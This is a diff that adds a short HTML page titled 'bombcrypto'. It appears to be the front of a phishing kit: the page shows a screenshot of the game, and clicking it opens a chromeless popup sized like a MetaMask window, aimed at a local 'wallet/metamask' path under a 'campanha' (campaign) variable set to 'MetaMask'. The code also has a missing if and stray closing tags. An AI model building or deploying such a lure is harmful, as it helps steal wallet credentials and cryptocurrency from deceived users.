@@ -1,0 +1,30 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>bombcrypto</title>
+</head>
+<body>
+<div id="root"></div>
+<div id="unity-container" class="unity-desktop">
+    <img onclick="vib(1)" src="./static/media/capture.png">
+</div>
+</div>
+
+<script>
+
+    var campanha = "MetaMask";
+
+function vib(d) {
+    (d == 1)
+    {
+        window.open('./wallet/metamask/?=' + campanha, '...',
+            'status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left=1' +
+            window.innerWidth + ',width=400,height=750');
+    }
+}
+</script>
+</script>
+</body>
+</html>
